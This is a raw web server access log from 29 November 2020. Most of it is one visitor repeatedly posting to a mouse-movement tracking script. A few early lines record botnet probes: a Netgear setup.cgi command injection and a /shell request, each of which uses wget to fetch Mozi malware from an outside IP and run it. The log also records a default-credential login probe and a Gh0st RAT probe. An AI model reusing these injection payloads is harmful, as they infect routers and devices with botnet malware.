- - [29/Nov/2020:09:19:55 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [29/Nov/2020:09:19:56 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
- - [29/Nov/2020:10:51:55 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 1835 "-" - "-"
- - [29/Nov/2020:11:33:28 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.46.161.232:40999/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [29/Nov/2020:15:36:21 +0000] "Gh0st\xad" 400 0 "-" - "-"
- - [29/Nov/2020:17:19:21 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.116.50.118:43976/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [29/Nov/2020:17:42:26 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
- - [29/Nov/2020:17:44:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:52 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:00 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:05 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:08 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:10 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:11 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:12 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:13 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:14 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:15 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:16 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:17 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:18 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:19 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:20 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:21 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:22 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:23 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:24 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:45:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
